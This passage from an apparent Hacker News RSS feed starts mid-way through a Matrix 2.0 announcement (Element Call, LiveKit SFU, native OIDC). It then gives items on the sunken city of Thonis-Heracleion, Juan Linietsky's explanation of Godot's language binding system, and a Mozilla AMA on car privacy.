<p>Another pillar of Matrix 2.0 is that we finally have native Matrix Group VoIP calling (<a href="https://github.com/matrix-org/matrix-spec-proposals/blob/matthew/group-voip/proposals/3401-group-voip.md">MSC3401</a>)!  Much like Sliding Sync has been developed using Element X as a testbed, <a href="https://call.element.io/">Element Call</a> has been the guinea pig for getting fully end-to-end-encrypted, scalable group voice/video calling implemented on top of Matrix, building on top of matrix-js-sdk.  And as of today, Element Call finally has it working, complete with end-to-end encryption (and integrated in Element X, for that matter)!</p>
<p><img src="https://matrix.org/blog/img/20230921-element-call.png" alt=""></p>
<p>Much like Sliding Sync, this has also been a bit of a journey.  The <a href="https://element.io/blog/introducing-native-matrix-voip-with-element-call/">original</a> implementations of Element Call strictly followed MSC3401, using full mesh conferencing to effectively have every participant place a call to every other participant - thus decentralising the conference and avoiding the need for a conferencing ‘focus’ server… but limiting the conference to 7 or 8 participants given all the duplication of the sent video required.  In Element Call <a href="https://element.io/blog/element-call-beta-2-encryption-spatial-audio-walkie-talkie-mode-and-more/">Beta 2</a>, end-to-end encryption was enabled; easy, given it’s just a set of 1:1 calls.</p>
<p>Then the real adventure began: to implement a Selective Forwarding Unit (SFU) which can be used to scale up to hundreds of users - or beyond. The unexpected first move came from Sean DuBois, project lead of the awesome <a href="https://pion.ly/">Pion</a> WebRTC stack for Golang - who wrote a proof-of-concept called sfu-to-sfu to demonstrate the viability of decentralised heterogenous cascading SFUs, as detailed in <a href="https://github.com/matrix-org/matrix-spec-proposals/blob/SimonBrandner/msc/sfu/proposals/3898-sfu.md">MSC3898</a>. This would not only let calls on a single focus scale beyond hundreds of users, but also share the conferencing out across all the participating foci, providing the world’s first heterogeneous decentralised video conferencing.  Element took the sfu-to-sfu implementation, hooked it up to Element Call on a branch, and renamed it as <a href="https://github.com/matrix-org/waterfall">waterfall</a>.</p>
<p>However, when Sean first contributed sfu-to-sfu, he mentioned to us that if Matrix is serious about SFUs, we should take a look at <a href="https://livekit.io/">LiveKit</a> - an open source startup not dissimilar to Element who were busy building best-in-class SFUs on top of Pion. And while waterfall worked well as a proof of concept, it became increasingly obvious that there’s a lot of work to be done around tuning congestion control, error correction, implementing end-to-end encryption etc which the LiveKit team had already spent years doing.  So, Element reached out to the LiveKit team, and started experimenting with what it might take to implement a Matrix-capable SFU on top of the LiveKit engine.</p>
<p>The end result was Element Call <a href="https://element.io/blog/element-call-beta-3/">Beta 3</a>, which is an interesting hybrid between MSC3401 and LiveKit’s existing signalling: the high-level signalling of the call (its existence, membership, duration etc) is advertised by Matrix - but the actual WebRTC signalling is handled by LiveKit, providing support for hundreds of users per call.</p>
<p>Finally, today marks the release of Element Call <a href="https://element.io/blog/element-x-ignition/#native-matrix-video-conferencing-with-element-call">Beta 4</a>, which adds back end-to-end encryption via the LiveKit SFU (currently by using a shared static secret, but in the near future will support full Matrix-negotiated end-to-end encryption with sender keys) - and also includes a complete visual refresh.  The next steps here include bringing back support for full mesh as well as SFU, for environments without an SFU, and updating all the MSCs to recognise the hybrid signalling model that reality has converged on when using LiveKit.  Meanwhile, head over to <a href="https://call.element.io/">https://call.element.io</a> to give it a go, or read more about it in the <a href="https://element.io/blog/element-x-ignition/">Element X Ignition blog post</a>!</p>
<h3 id="native-open-id-connect">Native Open ID Connect</h3>
<p>Finally, last but not least, we’re proud to announce that the project to replace Matrix’s venerable existing authentication APIs with industry-standard Open ID Connect in Matrix 2.0 has taken a huge leap forwards today, with <a href="https://matrix-org.github.io/matrix-authentication-service">matrix-authentication-service</a> now being available to add Native OIDC support to Synapse, as well as Element X now implementing account registration, login and management via Native OIDC (with legacy support only for login/logout).</p>
<p>This is a critical step forwards in improving the security and maintainability for Matrix’s authentication, and you can read all about it in this <a href="https://matrix.org/blog/2023/09/better-auth/">dedicated post</a>, explaining the rationale for adopting OpenID Connect for all forms of authentication throughout Matrix, and what you need to know about the transition.</p>
<h2 id="conclusion">Conclusion</h2>
<p>There has been an <strong>enormous</strong> amount of work that has gone into Matrix 2.0 so far - whether that’s implementing sliding sync in matrix-rust-sdk and sliding-sync proxy, matrix-authentication-service and all the native OIDC infrastructure on servers and clients, the entirety of Element Call and its underpinning matrix-js-sdk and SFU work, or indeed Faster Joins in Synapse, which shipped back in <a href="https://matrix.org/blog/2023/01/31/synapse-1-76-released/">Jan</a>.</p>
<p>It’s been a pretty stressful sprint to pull it all together, and huge thanks go to everyone who’s contributed - both from the team at Element, but also contributors to other projects like matrix-rust-sdk who have got caught in the crossfire :)  It’s also been amazing seeing the level of support, high quality testing and excellent feedback from the wider community as folks have got excited about the promise of Matrix 2.0.</p>
<p>On the Foundation side, we’d like to thank the <a href="https://matrix.org/blog/2023/06/membership-program/">Members</a> whose financial support has been critical in providing bandwidth to enable the progress on Matrix 2.0 - and for those who want to help accelerate Matrix, especially those commercially building on top of Matrix, please consider <a href="https://matrix.org/membership/">joining the Foundation</a> as a member!  Also, in case you missed it, we’re super excited to <a href="https://matrix.org/blog/2023/09/introducing-josh-simmons-managing-director/">welcome Josh Simmons as Managing Director</a> for the Foundation - focusing on running the Foundation membership programme and generally ensuring the growth of the Foundation funding for the benefit of the whole Matrix community. Matthew and Amandine continue to lead the overall project (alongside their day jobs at Element), with the support of the other three independent Guardians - but Josh is working full time exclusively on running the non-profit foundation and gathering funds to support Matrix.</p>
<p>Talking of funding, we should mention that we’ve had to pause work in other places due to lack of Matrix funding - especially while focusing on successfully shipping Matrix 2.0. Major next-generation projects including <a href="https://thirdroom.io/">Third Room</a>, <a href="https://arewep2pyet.com/">P2P Matrix</a>, and <a href="https://matrix.org/blog/2021/06/10/low-bandwidth-matrix-an-implementation-guide/">Low Bandwidth Matrix</a> have all been paused unless there’s a major shift in circumstances - so, if you have money and you’re interested in a world where the more experimental next-generation Matrix projects progress with folks working on them as their day job, please <a href="https://matrix.org/membership/">get in touch</a> with the Foundation.</p>
<h2 id="what-s-next">What’s next?</h2>
<p>While this is the first usable release of Matrix 2.0 implementations, there’s loads of work still to be done - obvious work on Matrix 2.0 includes:</p>
<ul>
<li>Getting Native OIDC enabled on matrix.org, and providing migration tools to Native OIDC for existing homeservers in general</li>
<li>Reworking Sliding Sync based on the lessons learned implementing it in matrix-rust-sdk</li>
<li>Actually getting the Matrix 2.0 MSCs stabilised and matured to the point they can be approved and merged into the spec</li>
<li>Adding encrypted backups to matrix-rust-sdk</li>
<li>Reintroducing full-mesh support for Native Matrix Group VoIP calling</li>
<li>Having a big Matrix 2.0 launch party once the spec lands!</li>
</ul>
<p>Outside of Matrix 2.0 work, other big items on the horizon include:</p>
<ul>
<li>Adding Rust matrix-sdk-crypto to matrix-js-sdk, at which point all the official Matrix.org client SDKs will (at last!) be using the same stable performant E2EE implementation</li>
<li>Continuing to contribute Matrix input to the MIMI working group in IETF for Digital Markets Act interoperability</li>
<li>Working on <a href="https://arewemlsyet.com/">MLS</a> for next-generation E2EE</li>
<li>Next generation moderation tooling and capabilities</li>
<li>Account Portability and Multihomed accounts</li>
<li>…and much much more.</li>
</ul>
<p>So: welcome to our brave new Matrix 2.0 world. We hope you’re excited about it as we are - and thanks to everyone for continuing to use Matrix and build on it.  Here’s to the beginning of a whole new era!</p>
<p>Matthew, Amandine and the whole Matrix team.</p>

        </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Sunken temple and sanctuary from ancient Egypt (125 pts)]]></title>
            <link>https://www.franckgoddio.org/projects/sunken-civilizations/heracleion/</link>
            <guid>37599312</guid>
            <pubDate>Thu, 21 Sep 2023 15:40:28 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.franckgoddio.org/projects/sunken-civilizations/heracleion/">https://www.franckgoddio.org/projects/sunken-civilizations/heracleion/</a>, See on <a href="https://news.ycombinator.com/item?id=37599312">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
									<p>With a unique survey-based approach that utilises the most sophisticated <a href="https://www.franckgoddio.org/franck-goddio/system-approach-technology/">technical equipment</a>, Franck Goddio and his team, in cooperation with the Egyptian Supreme Council of Antiquities, were able to locate, map and excavate parts of the city of Thonis-Heracleion, which lies 6.5 kilometres off today’s coastline. The city is located within an overall research area of 11 by 15 kilometres in the western part of Aboukir Bay at a depth of approx. 10 metres. Research started in 1996. It took years to map the entire area. First discoveries could be made in 2000. Franck Goddio has found important information on the ancient landmarks of Thonis-Heracleion, such as the <b>grand temple of Amun</b> and his son Khonsou (Herakles for the Greeks), the harbours that once controlled all trade into Egypt, and the daily life of its inhabitants. He has also solved a <a href="https://www.franckgoddio.org/fileadmin/pics/3_5_finds/documents/Franck_Goddio_Stele_Heracleion.pdf" title="Opens internal link in current window" target="_blank">historic enigma</a> that has puzzled Egyptologists over the years: the archaeological material has revealed that Heracleion and Thonis were in fact one and the same city with two names; Heracleion being the name of the city for the Greeks and Thonis for the Egyptians.</p>
									<h5>What the City looked like</h5>
									<p>The <a href="https://www.franckgoddio.org/finds/" title="Opens internal link in current window" target="_blank">objects</a> recovered from the excavations illustrate the cities’ beauty and glory, the magnificence of their grand temples and the abundance of historic evidence: <a href="https://www.franckgoddio.org/fileadmin/pics/3_5_finds/documents/Franck_Goddio_ColossalStatues.pdf" title="Opens internal link in current window" target="_blank">colossal statues</a>, inscriptions and architectural elements, jewellery and coins, ritual objects and ceramics - a civilization frozen in time.</p>
									<p>The quantity and quality of the archaeological material excavated from the site of Thonis-Heracleion show that this city had known a time of opulence and a peak in its occupation from the 6th to the 4th century BC. This is readily seen in the large quantity of coins and ceramics dated to this period. The port of Thonis-Heracleion had numerous large basins and functioned as a <b>hub of international trade</b>. The intense activity in the port fostered the city’s prosperity. More than <b>seven hundred discovered ancient anchors</b> of various forms and <b>79 wrecks</b> dating from the 6th to the 2nd century BC (further 40 wrecks could be detected but still require verification) are also an eloquent testimony to the intensity of maritime activity here.</p>
									<p>The city extended all around the temple and a network of canals in and around the city must have given it a lake dwelling appearance. On the islands and islets dwellings and secondary sanctuaries were located. Excavations here have revealed beautiful archaeological material such as <a href="https://www.franckgoddio.org/finds/#c2007">bronze statuettes</a>. On the north side of the temple to Herakles, a grand canal flowed through the city from east to west and connected the port basins with a lake to the west.</p>
									<div><p>Thonis-Heracleion was also the site of the <b>celebration of the Mysteries of Osiris</b>. This important ceremony was performed each year in honour of the rebirth of the god Osiris. Texts and figures in the Osirian chapels in the temple of Dendera and on the stele of the royal Decree of Canopus describe the details of the celebration of this vigil and re-awakening of the god. In his ceremonial boat Osiris was brought in procession from the city's great temple of Amun-Gereb to his shrine in <a href="https://www.franckgoddio.org/projects/sunken-civilizations/canopus/">Canopus</a>.</p><p> The underwater archaeological research in Thonis-Heracleion is ongoing until today. Franck Goddio estimates that only 5 percent of the city have yet been discovered.</p></div>
								</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Article reply “Godot is not the new Unity” from Juan Linietsky (BDFL of Godot) (246 pts)]]></title>
            <link>https://gist.github.com/reduz/cb05fe96079e46785f08a79ec3b0ef21</link>
            <guid>37598985</guid>
            <pubDate>Thu, 21 Sep 2023 15:21:02 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://gist.github.com/reduz/cb05fe96079e46785f08a79ec3b0ef21">https://gist.github.com/reduz/cb05fe96079e46785f08a79ec3b0ef21</a>, See on <a href="https://news.ycombinator.com/item?id=37598985">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="file-godot_binding_system_explained-md">
    <article itemprop="text"><p dir="auto">During the past days, this <a href="https://sampruden.github.io/posts/godot-is-not-the-new-unity/" rel="nofollow">great article</a> by Sam Pruden has been
making the rounds around the gamedev community. While the article provides an in-depth analysis, its a bit easy to miss the
point and exert the wrong conclusions from it. As such, and in many cases, users unfamiliar with Godot internals have used
it points such as following:</p>
<ul dir="auto">
<li>Godot C# support is inefficient</li>
<li>Godot API and binding system is designed around GDScript</li>
<li>Godot is not production ready</li>
</ul>
<p dir="auto">In this brief article, I will shed a bit more light about how the Godot binding system works and some detail on the Godot
architecture. This should hopefully help understand many of the technical decisions behind it.</p>
<h3 id="user-content-built-in-types" dir="auto"><a href="#built-in-types">Built-in Types</a></h3>
<p dir="auto">Compared to other game engines, Godot is designed with a relatively high level data model in mind. At the heart, it uses several
datatypes across the whole engine. These datatypes are:</p>
<ul dir="auto">
<li><strong>Nil</strong>: To indicate an empty value.</li>
<li><strong>Bool, Int64 and Float64</strong>: For scalar math.</li>
<li><strong>String</strong>: For String and Unicode handling.</li>
<li><strong>Vector2, Vector2i, Rect2, Rect2i, Transform2D</strong>: For 2D Vector math.</li>
<li><strong>Vector3, Vector4, Quaternion, AABB, Plane, Projection, Basis, Transform3D</strong>: For 3D Vector math.</li>
<li><strong>Color</strong>: For color space math.</li>
<li><strong>StringName</strong>: For fast processing of Unique IDs (internally a unique pointer).</li>
<li><strong>NodePath</strong>: For referencing paths between nodes in the Scene Tree.</li>
<li><strong>RID</strong>: Resource ID for referencing a resource inside a server.</li>
<li><strong>Object</strong>: An instance of a class.</li>
<li><strong>Callable</strong>: A generic function pointer.</li>
<li><strong>Signal</strong>: A signal (see Godot docs).</li>
<li><strong>Dictionary</strong>: A generic dictionary (can contain any of these datatypes as either key or value).</li>
<li><strong>Array</strong>: A generic array (can contain any of these datatypes).</li>
<li><strong>PackedByteArray, PackedInt32Array, PackedInt64Array, PackedFloatArray, PackedDoubleArray</strong>: Scalar packed arrays.</li>
<li><strong>PackedVector2Array, PackedVector3Array, PackedColorarray</strong>: Vector packed arrays.</li>
<li><strong>PackedStringArray</strong>: Packed string array.</li>
</ul>
<p dir="auto">Does this mean that anything you do in Godot has to use these datatypes? Absolutely not.
These datatypes have several roles in Godot:</p>
<ul dir="auto">
<li><strong>Storage</strong>: Any of these datatypes can be saved to disk and loaded back very efficiently.</li>
<li><strong>Transfer</strong>: These datatypes can be very efficiently marshalled and compressed for transfer over a network.</li>
<li><strong>Introspection</strong>: Objects in Godot can only expose their properties as any of those datatypes.</li>
<li><strong>Editing</strong>: When editing any object in Godot, it is done via any of these datatypes (of course, different editors can exist for the same datatype, depending on the context).</li>
<li><strong>Languge API</strong>: Godot exposes its API to all languages it binds via those datatypes.</li>
</ul>
<p dir="auto">Of course, if you are absolutely unfamliar to Godot, the first questions that come to mind are:</p>
<ul dir="auto">
<li>How do you expose more complex datatypes?</li>
<li>What about other datatypes such as int16?</li>
</ul>
<p dir="auto">In general, you can expose more complex datatypes via Object API, so this is not much of an issue. Additionally, modern processors all have at minimum 64 bit buses, so exposing anything other than 64 bit scalar types makes no sense.</p>
<p dir="auto">If you are unfamliar to Godot, I can totally understand the disbelief. But in truth, it works fine and it makes everything
far simpler at the time of developing the engine. This data model is one of the main reasons why Godot is such a tiny,
efficient and yet feature packed engine compared to the large mainstream mamooths. As you get more familiar with the source
code, you will start to see why.</p>
<h3 id="user-content-language-binding-system" dir="auto"><a href="#language-binding-system">Language Binding System</a></h3>
<p dir="auto">Now that we have our data model, Godot imposes a strict requirement that almost any function exposed to the engine API
must be done via those datatypes. Any function parameters, return types or properties exposed must be via them too.</p>
<p dir="auto">This makes the job of the binder much simpler. As such, Godot has what we call an universal binder. How does this binder work, then?</p>
<p dir="auto">Godot registers any C++ function to the binder like this:</p>
<div dir="auto"><pre>Vector3 <span>MyClass::my_function</span>(<span>const</span> Vector3&amp; p_argname) {
   <span><span>//</span>..//</span>
}

<span><span>//</span> Then, on a special function, Godot does:</span>

<span><span>//</span> Describe the method as having a name and the name of the argument, the pass the method pointer</span>
<span>ClassDB::bind_method</span>(D_METHOD(<span><span>"</span>my_function<span>"</span></span>,<span><span>"</span>my_argname<span>"</span></span>), &amp;MyClass::my_function);</pre></div>
<p dir="auto">Internally, <em>my_function</em> and <em>my_argument</em> are converted to a StringName (described above), so from now onwards they are
treated just as a unique pointer by the binding API. In fact, when compiling on release, the argument name is ignored by
the template and no code is generated, since it serves no purpose.</p>
<p dir="auto">So, what does <code>ClassDB::bind_method</code> do? If you want to dive into the depths of insanity and try to understand the
incredibly complex and optimized C++17 variadic templates black magic, feel free <a href="https://github.com/godotengine/godot/blob/master/core/object/method_bind.h">to go ahead</a>.</p>
<p dir="auto">But In short, it creates a static function like this, which Godot calls "ptrcall" form.:</p>
<div dir="auto"><pre><span><span>//</span> Not really done like this, but simplifying as much as possible so you get an idea:</span>

<span>static</span> <span>void</span> <span>my_function_ptrcall</span>(<span>void</span> *instance, <span>void</span> **arguments, <span>void</span> *ret_value) {
    MyClass *c = (MyClass*)instance;
    Vector3 *ret = (Vector3*)ret_value;
    *ret = c-&gt;<span>my_method</span>( *(Vector3*)arguments[<span>0</span>] );
}</pre></div>
<p dir="auto">This wrapper is basically as efficient as it can be. In fact, for critical functions, inline is forced into the class method, resulting in a C function pointer to the actual function code.</p>
<p dir="auto">Then Language API works by allowing the request of any engine function in "ptrcall" format. To call this format,
the language must:</p>
<ul dir="auto">
<li>Allocate a bit of stack (basically just adjusting the stack pointer of the CPU)</li>
<li>set a pointer to the arguments (which already exist in native form in this language 1:1, be it GodotCPP, C#, Rust, etc).</li>
<li>call.</li>
</ul>
<p dir="auto">And that's it. This is an incredibly efficient generic glue API that you can use to expose any language to Godot efficiently.</p>
<p dir="auto">So, as you can imagine, the C# API in Godot basically uses a C function pointer via unsafe API to call after assigning pointers
to native C# types. It is very, very efficient.</p>
<h3 id="user-content-godot-is-not-the-new-unity---the-anatomy-of-a-godot-api-call" dir="auto"><a href="#godot-is-not-the-new-unity---the-anatomy-of-a-godot-api-call">Godot is not the new Unity - The anatomy of a Godot API call</a></h3>
<p dir="auto">I want to insist that the article written by Sam Pruden is fantastic, but if you are not familiar with how Godot is intended to work under the hood it can be very misleading. I will proceed to explain a bit more in detail what is easy to misunderstand.</p>
<h4 id="user-content-only-a-pathological-use-case-is-shown-the-rest-of-the-api-is-fine" dir="auto"><a href="#only-a-pathological-use-case-is-shown-the-rest-of-the-api-is-fine">Only a pathological use case is shown, the rest of the API is fine.</a></h4>
<p dir="auto">The use case shown in the article, the ray_cast function, is a pathological one in the Godot API.
Cases like this are most likely less 0.01% of the API exposed by Godot. Why the author found this specific one,
I have no idea nor I will speculate, but I think it was just an unfortunate coincidence.</p>
<p dir="auto">The problem is that, at the C++ level, this function takes a struct pointer for performance. But at the language
binding API this is difficult to expose properly. This is very old code (dating to the opensourcing of Godot) and
a Dictionary was hacked-in to use temporarily until something better is found. Of course, other stuff was more prioritary and very few games need thousands of raycasts, so pretty much nobody complained. Still, there is a <a href="https://github.com/godotengine/godot-proposals/issues/7329" data-hovercard-type="issue" data-hovercard-url="/godotengine/godot-proposals/issues/7329/hovercard">recently open proposal</a> to discuss more efficient binding of these types of functions.</p>
<p dir="auto">Additionally, to add to how unfortunate this choice of function is, the Godot language binding system <em>does</em> support
struct pointers like this. GodotCPP and Rust bindings can use pointers to structs without any issue. The problem
is that C# support in Godot predates the extension system and it was not converted to it yet. Eventually, C# will be
moved to the universal extension system and this will allow the unifying of the default and .net editors, it is just
not the case yet, but its top in the list of priorities.</p>
<h4 id="user-content-the-workaround-is-even-more-pathological" dir="auto"><a href="#the-workaround-is-even-more-pathological">The workaround is even more pathological</a></h4>
<p dir="auto">Although this time, due to a limitation of C#. If you bind C++ to C#, you need to create a C# version of a C++ instance
as an adapter. This is not an unique problem to Godot, any other engine or application doing this will require the same.</p>
<p dir="auto">Why is it troublesome? because C# has a garbage collector and C++ does not. This forces the C++ instance to keep a link
to the C# instance to avoid it from being collected.</p>
<p dir="auto">Due to this, the C# binder must do extra work when calling Godot functions that take class instances. You can see
this code in Sam's article:</p>
<div dir="auto"><pre><span>public</span> <span><span>static</span></span> GodotObject <span>UnmanagedGetManaged</span><span>(</span><span>IntPtr</span> <span>unmanaged</span><span>)</span>
<span>{</span>
    <span>if</span> <span>(</span><span>unmanaged</span> <span>==</span> IntPtr<span>.</span>Zero<span>)</span> <span>return</span> <span>null</span><span>;</span>

    <span>IntPtr</span> <span>intPtr</span> <span>=</span> NativeFuncs<span>.</span><span>godotsharp_internal_unmanaged_get_script_instance_managed</span><span>(</span>unmanaged<span>,</span> <span>out</span> <span>var</span> r_has_cs_script_instance<span>)</span><span>;</span>
    <span>if</span> <span>(</span><span>intPtr</span> <span>!=</span> IntPtr<span>.</span>Zero<span>)</span> <span>return</span> <span>(</span>GodotObject<span>)</span>GCHandle<span>.</span><span>FromIntPtr</span><span>(</span>intPtr<span>)</span><span>.</span>Target<span>;</span>
    <span>if</span> <span>(</span>r_has_cs_script_instance<span>.</span><span>ToBool</span><span>(</span><span>)</span><span>)</span> <span>return</span> <span>null</span><span>;</span>

    <span>intPtr</span> <span>=</span> NativeFuncs<span>.</span><span>godotsharp_internal_unmanaged_get_instance_binding_managed</span><span>(</span>unmanaged<span>)</span><span>;</span>
    <span>object</span> <span>obj</span> <span>=</span> <span>(</span><span>(</span><span>intPtr</span> <span>!=</span> IntPtr<span>.</span>Zero<span>)</span> <span>?</span> GCHandle<span>.</span><span>FromIntPtr</span><span>(</span>intPtr<span>)</span><span>.</span>Target <span>:</span> <span>null</span><span>)</span><span>;</span>
    <span>if</span> <span>(</span><span>obj</span> <span>!=</span> <span>null</span><span>)</span> <span>return</span> <span>(</span><span>GodotObject</span><span>)</span><span>obj</span><span>;</span>

    <span>intPtr</span> <span>=</span> NativeFuncs<span>.</span><span>godotsharp_internal_unmanaged_instance_binding_create_managed</span><span>(</span>unmanaged<span>,</span> intPtr<span>)</span><span>;</span>
    <span>if</span> <span>(</span><span>!</span><span>(</span><span>intPtr</span> <span>!=</span> IntPtr<span>.</span>Zero<span>)</span><span>)</span> <span>return</span> <span>null</span><span>;</span>

    <span>return</span> <span>(</span>GodotObject<span>)</span>GCHandle<span>.</span><span>FromIntPtr</span><span>(</span>intPtr<span>)</span><span>.</span>Target<span>;</span>
<span>}</span></pre></div>
<p dir="auto">While very efficient, it's still not ideal for hot paths so the Godot API exposed is considerate and does not expose anything critical this way. The workaround used, however, is quite complex and hits this path due to not using the actual function
intended for it.</p>
<h4 id="user-content-the-question-of-cherry-picking" dir="auto"><a href="#the-question-of-cherry-picking">The question of cherry picking</a></h4>
<p dir="auto">I firmly believe the author did not cherry pick this API on purpose. In fact, he himself writes that he checked other places of
API usages and did not find anything with this level of pathology either.</p>
<p dir="auto">However, he mentions:</p>
<pre><code>Let’s also remember that Dictionary is only part of the problem. If we look a little wider for things returning 
Godot.Collections.Array&lt;T&gt; (remember: heap allocated, contents as Variant) we find lots from physics, 
mesh &amp; geometry manipulation, navigation, tilemaps, rendering, and more.
</code></pre>
<p dir="auto">From my side and contributors side, none of those usages are hot paths or pathological. Remember that, as I mentioned above,
Godot uses the Godot types mainly for serialization and API communication. While it is true that they do heap allocation,
this only happens once when the data is created.</p>
<p dir="auto">I think what may have confused Sam and a few others in this area (which is normal if you are not familiar with the Godot codebase) is that Godot containers don't work like STL containers. Because they are used mainly to pass data around, they are
allocated once and then kept via reference counting.</p>
<p dir="auto">This means, the function that reads your mesh data from disk is the only one doing the allocation, then this pointer gets
passed through many layers via reference counting until arrives Vulkan and is uploaded to the GPU. Zero copies happen along
the way.</p>
<p dir="auto">Likewise, when these containers are exposed to C# via the Godot collections, they are also reference counted internally.
If you create one of those arrays to pass the the Godot API, the allocation only happens <em>once</em>. Then no further copies happen
and the data arrives intact to the consumer.</p>
<p dir="auto">Of course, intenally, Godot uses far more optimized containers that are not directly exposed to the binder API.</p>
<h4 id="user-content-misleading-conclusion" dir="auto"><a href="#misleading-conclusion">Misleading conclusion</a></h4>
<p dir="auto">The article concludes like this:</p>
<pre><code>Godot has made a philosophical decision to be slow. The only practical way to interact with the engine is via this binding layer, and its core design prevents it from ever being fast. No amount of optimising the implementation of Dictionary or speeding up the physics engine is going to get around the fact we’re passing large heap allocated values around when we should be dealing with tiny structs. While C# and GDScript APIs remain synchronised, this will always hold the engine back.
</code></pre>
<p dir="auto">As you have read in the above points, the binding layer is absolutely not slow. What can be slow is an extremely limited amount of use cases that can be pathological. For those cases, a dedicated solution is found. This is a general <a href="https://docs.godotengine.org/en/stable/contributing/development/best_practices_for_engine_contributors.html#to-each-problem-its-own-solution" rel="nofollow">philosophy</a> behind Godot development that helps keep the codebase small, tidy, maintainable and easy to understand.</p>
<p dir="auto">In other words, this principle:</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer nofollow" href="https://user-images.githubusercontent.com/6265307/269689859-d3bb5bec-1473-4803-a7d4-9ebc33736d48.png"><img src="https://user-images.githubusercontent.com/6265307/269689859-d3bb5bec-1473-4803-a7d4-9ebc33736d48.png" alt="image"></a></p>
<p dir="auto">The current binder serves its purpose and works well and efficiently for over 99.99% of use cases. For the exceptional ones, as mentioned before, the extension API supports structs already (which you can see here in this excerpt of the extension api dump):</p>
<pre><code>		{
			"name": "PhysicsServer2DExtensionRayResult",
			"format": "Vector2 position;Vector2 normal;RID rid;ObjectID collider_id;Object *collider;int shape"
		},
		{
			"name": "PhysicsServer2DExtensionShapeRestInfo",
			"format": "Vector2 point;Vector2 normal;RID rid;ObjectID collider_id;int shape;Vector2 linear_velocity"
		},
		{
			"name": "PhysicsServer2DExtensionShapeResult",
			"format": "RID rid;ObjectID collider_id;Object *collider;int shape"
		},
		{
			"name": "PhysicsServer3DExtensionMotionCollision",
			"format": "Vector3 position;Vector3 normal;Vector3 collider_velocity;Vector3 collider_angular_velocity;real_t depth;int local_shape;ObjectID collider_id;RID collider;int collider_shape"
		},
		{
			"name": "PhysicsServer3DExtensionMotionResult",
			"format": "Vector3 travel;Vector3 remainder;real_t collision_depth;real_t collision_safe_fraction;real_t collision_unsafe_fraction;PhysicsServer3DExtensionMotionCollision collisions[32];int collision_count"
		},
</code></pre>
<p dir="auto">So, ultimately, I believe that the conclusion that "Godot is slow by design" is a bit rushed. What is currently missing is the move of the C# language to the GDExtension system in order to be able to take advantage of these. This is currently a work in progress.</p>
<h3 id="user-content-to-sum-up" dir="auto"><a href="#to-sum-up">To sum up</a></h3>
<p dir="auto">I hope that this short article is used to dispell a few misconceptions that unintentionally arised from Sam's excellent article:</p>
<ul dir="auto">
<li><strong>Godot C# API is inefficient:</strong> This is absolutely not the case, but very few pathological cases remain to be solved and were already being in discussion before last week. In practice, very very few games may run into them and, by next year, hopefully none.</li>
<li><strong>Godot API is designed around GDScript:</strong> This is also not true. In fact, until Godot 4.1, typed GDScript did calls via "ptrcall" syntax, and the argument encoding was a bottleneck. As a result, we created a <a href="https://github.com/godotengine/godot/pull/79893" data-hovercard-type="pull_request" data-hovercard-url="/godotengine/godot/pull/79893/hovercard">special path</a> for GDScript to call more efficiently.</li>
</ul>
<p dir="auto">Thanks for reading and remember that Godot is not commercial software developed behind closed doors. All of us who make it are available online in the same communities as you. If you have any doubt, feel free to ask us directly.</p>
<p dir="auto"><strong>Bonus:</strong> As a side note, and contrary to popular belief, the Godot data model was not created for GDScript. Originaly, the engine used other languages such as Lua or Squirrel, with several published games while an in-house engine. GDScript was developed afterwards.</p>
</article>
  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[We're the Researchers who looked into the privacy of 25 of the top car brands (101 pts)]]></title>
            <link>https://old.reddit.com/r/IAmA/comments/16oi17v/were_the_researchers_who_looked_into_the_privacy/</link>
            <guid>37598845</guid>
            <pubDate>Thu, 21 Sep 2023 15:13:00 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://old.reddit.com/r/IAmA/comments/16oi17v/were_the_researchers_who_looked_into_the_privacy/">https://old.reddit.com/r/IAmA/comments/16oi17v/were_the_researchers_who_looked_into_the_privacy/</a>, See on <a href="https://news.ycombinator.com/item?id=37598845">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>UPDATE: Thank you for joining us and for your thoughtful questions! To learn more, you can visit <a href="https://www.privacynotincluded.org/">www.privacynotincluded.org</a> and read our full reviews. You can also get smarter about your online life with regular <a href="https://foundation.mozilla.org/en/newsletter/">newsletters</a> from Mozilla and remember to sign our <a href="https://foundation.mozilla.org/en/privacynotincluded/articles/car-companies-stop-your-huge-data-collection-programs-en/">petition</a> to help us demand change!</p>

<p>To learn more about the data your car might be collecting, access your free Vehicle Privacy Report from Privacy4Cars here: <a href="https://vehicleprivacyreport.com/">https://vehicleprivacyreport.com</a>.   </p>

<p>Hi, we’re Jen Caltrider, Misha Rykov and Zoe MacDonald- lead Researchers of the <a href="https://foundation.mozilla.org/en/privacynotincluded/">*Privacy Not Included Guide</a> from Mozilla! We're also joined by Andrea from Privacy4Cars,a privacy-tech company focused on solving privacy challenges posed by vehicle data, and we’re all here to answer your burning questions about our recent Cars + Privacy report.</p>

<p><a href="https://twitter.com/mozilla/status/1704602084291613032?ref_src=twsrc%5Egoogle%7Ctwcamp%5Eserp%7Ctwgr%5Etweet">Here's our proof.</a></p>

<p>We’ve reviewed a lot of product privacy policies over the years, but the car category is the worst for privacy that we have ever reviewed. All 25 of of the brands we researched failed our review and earned our *Privacy Not Included label; a sad first.Here's a summary of what we found:</p>

<ul>
<li>They collect too much personal data (all of them) - On top of collecting information regarding your in-car app usage and connected services, they can also collect super intimate information about you -- from your medical information, your genetic information, to your “sex life”</li>
<li>Most (84%) share or sell your data, and some (56%) also say they can share your information with the government or law enforcement in response to a “request.”</li>
<li>Most (92%) give drivers little to no control over their personal data - All but two of the 25 car brands we reviewed earned our “ding” for data control</li>
<li>We couldn’t confirm whether any of them meet our Minimum Security Standards</li>
</ul>

<p>Learn more about our findings and read the full report <a href="https://foundation.mozilla.org/en/privacynotincluded/articles/its-official-cars-are-the-worst-product-category-we-have-ever-reviewed-for-privacy/">here</a>.</p>

<p>Also! Check out Privacy4Cars' Vehicle <a href="https://vehicleprivacyreport.com/">Privacy Report</a> to know about and take actions for your vehicle.</p>

<p>Ask us anything about our guide, research or anything else!</p>
</div></div>]]></description>
        </item>
        <item>
